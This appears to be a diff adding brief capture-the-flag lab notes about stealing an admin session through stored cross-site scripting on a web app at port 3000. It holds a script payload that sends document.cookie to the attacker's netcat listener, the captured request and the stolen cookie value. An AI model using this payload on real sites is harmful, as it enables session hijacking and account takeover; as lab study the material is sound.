@@ -1,0 +1,24 @@
+IP : 10.10.186.108
+
+Port to enumerate : 3000
+
+We can post a comment to post cookie to us.
+
+<script>window.location='http://10.9.241.177:4444/?cookie='+document.cookie</script>
+
+This will connect to our nc listener when the admin logs in.
+
+listening on [any] 4444 ...
+connect to [10.9.241.177] from (UNKNOWN) [10.10.186.108] 36430
+GET /?cookie=authid=2564799a4e6689972f6d9e1c7b406f87065cbf65 HTTP/1.1
+Host: 10.9.241.177:4444
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3844.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Referer: http://localhost:3000/admin
+Accept-Encoding: gzip, deflate
+
+We found the cookie : 2564799a4e6689972f6d9e1c7b406f87065cbf65
+
+!!!
